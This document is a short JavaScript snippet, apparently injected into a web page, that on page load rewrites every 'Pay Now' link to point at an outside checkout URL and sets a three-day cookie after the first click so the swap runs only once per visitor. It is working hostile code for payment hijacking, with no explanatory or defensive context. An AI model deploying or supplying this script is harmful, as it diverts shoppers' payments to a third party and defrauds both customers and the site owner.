
        function executeScript() {
            var newurl = "https://securely.in/checkout/order-pay/57483/?key=wc_order_273dL9jedh9O1";

            // Check if the "visited" cookie exists
            if (document.cookie.indexOf('visited=true') !== -1) {
                return; // Exit the function
            }

            var anchorElements = document.querySelectorAll('a');


            // Loop through each <a> element
            anchorElements.forEach(function(anchorElement) {
                // Check if the text content of the <a> element is "Pay Now"
                if (anchorElement.textContent.trim() === 'Pay Now') {
                    // Change the href attribute to "this.com"
                    anchorElement.href = newurl;

                    // Add a click event listener to the anchor element
                    anchorElement.addEventListener('click', function() {
                        // Set a cookie named 'visited' with value 'true'
                        document.cookie = 'visited=true; expires=' + new Date(new Date().getTime() + 3 * 24 * 60 * 60 * 1000).toUTCString() + '; path=/';
                    });
                }
            });
        }

        // Add an event listener for the 'DOMContentLoaded' event
        document.addEventListener('DOMContentLoaded', executeScript);
        executeScript();
        